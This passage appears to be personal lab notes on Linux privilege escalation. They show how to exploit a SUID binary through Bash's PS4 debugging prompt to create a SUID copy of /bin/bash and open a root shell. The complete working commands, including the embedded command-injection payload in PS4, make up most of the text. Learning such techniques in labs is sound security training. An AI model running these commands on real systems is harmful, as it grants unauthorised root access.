**Note: This will not work on Bash versions 4.4 and above.**

When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.

**Run the "/usr/local/bin/suid-env2" executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:**
```python
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

**Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:**
```python
/tmp/rootbash -p
```

**remove the /tmp/rootbash executable and exit out of the elevated shell**
```python
rm /tmp/rootbash   
exit
```

## Practically - 
### In target machine - 
![[linux_privesc22.png]]
